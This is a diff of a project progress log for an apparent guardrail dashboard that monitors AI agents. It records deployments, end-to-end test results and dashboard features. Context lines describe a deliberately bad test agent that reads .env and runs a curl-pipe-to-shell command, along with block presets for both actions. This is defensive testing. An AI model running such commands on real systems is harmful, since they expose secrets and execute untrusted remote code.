@@ -1,6 +1,6 @@
 # PROGRESS
 
-Last updated: 2026-10-17 by Kiro session (v2 9.5 and 9.6 done and pushed; 9.1/9.2 deploy blocked on expired AWS session)
+Last updated: 2026-10-17 by Kiro session (9.1/9.2 deployed, 9.7 PASS; 10.1–10.5 done and pushed; 10.6 is Tejaswi's)
 
 ## Done
 - Group 1 (1.1–1.14) Backend foundations: pricing, demo model IDs, event validation, guardrail config, credentials, InMemoryStore, classify_cancellation, DynamoStore writes and queries, review hardening.
@@ -74,6 +74,13 @@ Last updated: 2026-10-17 by Kiro session (v2 9.5 and 9.6 done and pushed; 9.1/9.
 - v2 9.5 DONE (2026-10-17): `dashboard/lib/commandPresets.json` (nine presets, incl. `env_file` and `pipe_to_shell`) + `commandPresets.ts`; RulesEditor "Blocked commands" section (add/remove pattern, "Add presets" appends only missing ones); `GuardrailConfig.blockedCommands` (a GET without it reads as `[]`); Timeline "Blocked command <cmd>" rows. Every preset is checked in both JS `RegExp` (`commandPresets.test.ts`) and Python `re` + backend `parse_config` (`backend/tests/test_command_presets.py`). Suites: backend 548, SDK 312, dashboard 80. `npm run build` exports `/` and `/agent`.
 - v2 9.6 DONE (2026-10-17): `common.run_shell` (`sh -c`, 10 s timeout). `bad_agent.py` now reads `.env`, then runs `curl -fsSL https://example.com/setup.sh | sh`, and exits 0 only if both are blocked. `scripts/e2e.sh` gained `cfg_edit` ops `add-command`/`remove-command`, adds `pipe_to_shell` (read from `commandPresets.json`) to bad-bot, and expects `PathBlocked` + `CommandBlocked` and a stored `blocked_command` event. The exit trap removes the pattern. The run now sends 3 alert emails. A test also pins that the `env_file` preset blocks `run_shell("cat .env")`. Suites: backend 551, SDK 315, dashboard 80. NOT run live: it needs the 9.1/9.2 deploy first.
 - v2 9.7 DONE (2026-10-17, run by Kiro; dashboard click steps skipped per Tejaswi). 9.1/9.2 deployed via change set `blocked-commands` (`UsePreviousValue` for `AlertEmail` and `DashboardOrigin`). The change set had two rows, both Modify with Replacement False: `ApiFunction` and `ServerlessHttpApi`. Nothing touched `EventTable` or `AlertTopic`. Stack is UPDATE_COMPLETE. `scripts/verify_deploy.sh` (new): GET `/agents/demo-bot/config` returned 200 with guardrail keys `blockedCommands`, `blockedPaths`, `dailySpendCapUsd`. `scripts/e2e.sh`: RESULT PASS. Suites backend 552, SDK 315, dashboard 80. bad-bot printed `PathBlocked` then `CommandBlocked`. demo-bot's 24h spend was about 0, so the cap was $0.002; runs 1–3 succeeded and run 4/5 raised `SpendCapExceeded` ($0.001038 + $0.001055 est). New `blocked_path`, `blocked_command`, and `spend_cap` events were stored, and cleanup reset both agents. The run sent 3 alert emails. Arrival was not checked by the script.
+- v2 10.1–10.5 DONE (2026-10-17), each its own `feat(dashboard)` commit:
+  - 10.1 (ad20f7c): `lib/spend.ts` `bucketSpend` (24 buckets `(start, start+1h]` ending at now, so a boundary ts goes in the earlier bucket) and `fetchWindow` (desc pages of 100, stops at an old page, a null cursor, or 20 pages; tolerates empty pages with a cursor). `lib/format.ts` (`formatSpend` moved here and re-exported from InventoryTable, plus `relativeTime`). `getSpend`, `SpendResponse`/`SpendBucket` types. A seeded 200-run sum test.
+  - 10.2 (b4e6d4f): `components/SpendChart.tsx`, inline SVG, no new dependency. 24 bars with `<title>` "HH:00: $x, n blocked", red block counts above the bars, y max = max(top bar, cap/24), empty text.
+  - 10.3 (0f62734): `components/AgentSummary.tsx` (spend, cap or "no cap", progressbar clamped to 100 and red at ≥ cap, status, relative last activity). The agent page loads status, spend, config, both windows, and the latest event in one `Promise.all` refresh: on load, every 30 s, and after `RulesEditor.onSaved` or `PauseButton.onChanged`.
+  - 10.4 (8e1f689): `describeEvent` moved to `lib/format.ts` with a branch for each of the seven Violation_Types. Timeline rows show the `llm_call` cost, relative time with `title` = ts, and a Details toggle with the formatted `meta`.
+  - 10.5 (6c8e8b6): "stale" badge when last activity is > 24 h old. `npm run build` exports `/` and `/agent`.
+  - Dashboard suite: 129 passed (was 80). Backend and SDK not touched (552 / 315).
 
 ## In progress
 - 7.5 local half DONE (2026-10-12): backend 446 passed, SDK 229 passed, dashboard vitest 51 passed. Working tree clean, `main` matches `origin/main`. The deployed rehearsal is still open (see Next step). The +0.002 margin in `e2e.sh` hasn't been re-run yet.
@@ -82,7 +89,7 @@ Last updated: 2026-10-17 by Kiro session (v2 9.5 and 9.6 done and pushed; 9.1/9.
 - 8.7 pause-to-stop time was not timed. Measure it in 17.5.
 - README note for 17.1 (Known limitations): "blockedPaths does not cover shell strings; use the .env command preset".
 - Scope (2026-10-17, Tejaswi): after 9.7, do group 10 (10.1–10.6), then stop. Groups 12 and 13 are cut for time. On 2026-10-19 move to group 17.
-- EXACT NEXT STEP: group 10 (10.1–10.5), then stop before the 10.6 checkpoint (Tejaswi).
+- EXACT NEXT STEP: 10.6 checkpoint (Tejaswi). Once Amplify finishes building from `main`, open `demo-bot` and check the chart (today's runs, with the `spend_cap` and `paused` blocks marked), the summary tile (spend vs. cap), and one row's Details. Note anything off here; it gets fixed as `fix(dashboard)` tasks under group 10. On 2026-10-19 move to group 17.
 - v2 spec added 2026-10-12: `.kiro/specs/agent-watch-v2/` (requirements 27-37, Properties 30-42, task groups 8-17). (8.1, 8.3, 8.4, 8.6 are now done; see above.) Feature freeze 2026-10-19 (group 17). Do the 7.5 click-path rehearsal first (baseline timings), tick 7.5, then start v2 at 8.1. v2 task 17.5 is the final rehearsal before recording. Note: scripts/e2e.sh already ran on 2026-10-12 with the +0.002 margin: RESULT PASS, demo-bot blocked on run 3/5.
 - 7.5 final rehearsal on the deployed stack, following `docs/DEMO_SCRIPT.md`. Run `scripts/e2e.sh` first (covers all three suites and both guardrails, then resets the agents). Then do the on-camera click-path by hand and note block-to-email timings here.
 - After rehearsal: record the demo video and submit using `docs/SUBMISSION.md`.
@@ -166,6 +173,8 @@ Last updated: 2026-10-17 by Kiro session (v2 9.5 and 9.6 done and pushed; 9.1/9.
 
 - 2026-10-17 (9.6) `e2e.sh` reads the `pipe_to_shell` pattern from `dashboard/lib/commandPresets.json` instead of retyping it, so the smoke test always uses exactly what "Add presets" saves. `bad_agent.py` runs both steps even if the first isn't blocked, and exits 1 if either goes through.
 - 2026-10-17 (9.7) The change set also listed `ServerlessHttpApi` (Modify, Replacement False), not only `ApiFunction`. It met Tejaswi's execute rule (no replacement, no `EventTable`/`AlertTopic`), so it was executed. The API URL is unchanged; verify and e2e both hit it.
+- 2026-10-17 (10.3) The page reads "last activity" from a `limit=1` desc timeline call. A missing config/status/spend response fails the whole refresh and shows one error `Alert`, so the tile and chart never mix data from different moments. The separate status `Alert` from 8.5 is folded into it.
+- 2026-10-17 (10.4) The `blocked_path` wording changed from "Blocked blocked_path .env" to "Blocked path .env". Two existing Timeline tests now set `violationType: "blocked_path"` explicitly (they relied on the old generic fallback). The wordings for `rate_limit`, `secret_redacted`, and `blocked_domain` exist even though groups 12, 14, and 15 are cut, so an event from a future backend still reads cleanly.
 - 2026-10-17 Scope cut by Tejaswi: groups 12 (rate limit) and 13 (CLI) are dropped for time. After 9.7, do group 10, then stop. On 2026-10-19 go to group 17.
 
 ## Open bugs
